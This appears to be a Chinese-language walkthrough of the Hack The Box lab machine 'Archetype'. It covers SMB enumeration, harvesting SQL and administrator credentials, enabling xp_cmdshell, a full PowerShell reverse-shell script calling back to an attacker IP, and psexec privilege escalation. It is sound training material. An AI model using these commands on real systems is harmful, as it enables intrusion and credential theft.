# Archetype
###### tags: `HTB_Starting Point`
1. 確認是否可以成功連線
```
ping 10.10.10.27 -c 4
```
![](https://i.imgur.com/Dj2unIt.png)

2. 執行端口掃描
```
nmap -A -T4 -oA nmap/Archetype 10.10.10.27
```
![](https://i.imgur.com/DgOgCwQ.png)
* 445&1433Port是打開的，它們與文件共享（SMB）和SQL Server相關聯。值得檢查是否允許匿名訪問，因為文件共享通常存儲包含密碼或其他敏感信息的配置文件。

3. 使用smbclient列出可用的共享
```
smbclient -N -L \\\\10.10.10.27\\
```
![](https://i.imgur.com/s6ro1tf.png)
* 嘗試訪問Backup，看看裡面有什麼線索。

![](https://i.imgur.com/RM1dULb.png)
* 有一個dtsConfig文件，它是與SSIS一起使用的配置文件。用Get將檔案載下來
```
get prod.dtsConfig
```
![](https://i.imgur.com/eOD04Hc.png)


* 查看一下檔案是否有可用資訊
```
cat prod.dtsConfig
```
![](https://i.imgur.com/xMrkdjH.png)
* 我們看到它包含一個SQL連接字符串，其中包含本地Windows用戶ARCHETYPE \ sql_svc的憑據。
```
cat prod.dtsConfig |grep ARCHETYPE
```
![](https://i.imgur.com/oTGhMYA.png)
* Found a credential:
	User = ARCHETYPE\sql_svc
	Password = M3g4c0rp123

4. 使用Impacket的mssqlclient.py連接到SQL Server。
```
git clone https://github.com/SecureAuthCorp/impacket
```
![](https://i.imgur.com/S0glJIn.png)
* 可以使用IS_SRVROLEMEMBER函數來顯示當前SQL用戶是否在SQL Server上具有sysadmin（最高級別）特權。當具有sysadmin特權時使我們能夠啟用xp_cmdshell並在主機上獲得RCE。
* 需要先安裝[pip3](https://bootstrap.pypa.io/get-pip.py)才能夠安裝impacket
```
apt update && apt upgrade 

apt install python3-pip 
```
* 檢查版本
```
pip3 --version
```
* 如果基於某種奇怪的原因安裝不起來，一直出現Error，可以點上面pip3連結直接下載檔案並用下列指令安裝
```
cd ~/Downloads 

python3 get-pip.py
```
* 安裝[Impacket](https://www.youtube.com/watch?v=wcs-OvCEd4A&ab_channel=UjjwalBasnyat)，附上參考影片
```
pip3 install -r /opt/impacket/requirements.txt

python3 ./setup.py install
```
* 嘗試連線登入
```
mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
```
![](https://i.imgur.com/aX6Rped.png)

5. 檢查我們是否對SQL數據庫具有管理特權
```
SELECT IS_SRVROLEMEMBER('sysadmin')
```
* 輸出結果為1，代表為真，的確有管理員權限

![](https://i.imgur.com/QcIIHN4.png)

* 由於要透過SQL Shell執行cmd命令，需要有一個名為的命令xp_cmdshell，我們必須對資料庫修進行系統配置的修改，為此，我們需要管理特權，這也是需要管理員權限的原因。(先檢查一下系統預設值)
```
sp_configure
```
![](https://i.imgur.com/81fg4LK.png)

* 啟用show advanced options
```
EXEC sp_configure 'show advanced options', 1

reconfigure;
```
![](https://i.imgur.com/nqLiT3L.png)

* 啟用xp_cmdshell
```
EXEC sp_configure 'xp_cmdshell', 1

reconfigure;

```
![](https://i.imgur.com/AZdlnV8.png)

* 最後檢查一下是否成功啟用上述兩項配置
```
sp_configure;
```
![](https://i.imgur.com/pDOYvB3.png)

6. Exploit
* 現在我們可以使用以下命令運行cmd命令 xp_cmdshell
```
xp_cmdshell "whoami"
```
![](https://i.imgur.com/3w32pAI.png)
* 將上面的powershell Script複製到帶有擴展名的文件中.ps1(將script中的IP更改為您自己的htb IP)
```
ifconfig

vim shell.ps1

$client = New-Object System.Net.Sockets.TCPClient("10.10.14.8",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 
```
![](https://i.imgur.com/wI1kSz6.png)

*  在Reverse Shell腳本文件夾中啟動python服務器，以便我們可以將腳本下載到受害系統上並運行它。
```
sudo python3 -m http.server 80
```
![](https://i.imgur.com/ntHGQJW.png)

* 使用啟動監聽器netcat。當目標系統試圖連接到我們時，我們需要監聽它。由此得名：reverse shell
```
sudo nc -lvnp 443
```
![](https://i.imgur.com/lpM2R6t.png)
* 連線成功後，我們可以獲得archetype\sql_svc帳號權限，並取得普通user flag
```
whoami

type c:\users\sql_svc\desktop\user.txt
```
![](https://i.imgur.com/dn16AsS.png)

7. 權限提升
* 查看Powershell歷史記錄，查看該用戶最近的操作是什麼
```
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```
![](https://i.imgur.com/601Lwu7.png)
Found a credential:
User = Administrator
Password = MEGACORP_4dm1n!!
* 現在我們有了管理員密碼，我們可以嘗試使用psexec登錄。(可以在impacket/examples路徑下找到)
```
cd impacket/examples

ls -al |grep psexec

python3 psexec.py administrator@10.10.10.27
```
![](https://i.imgur.com/tUG8shG.png)
* Get Flag!
```
type c:\users\administrator\desktop\root.txt
```
![](https://i.imgur.com/VMOwCCB.png)

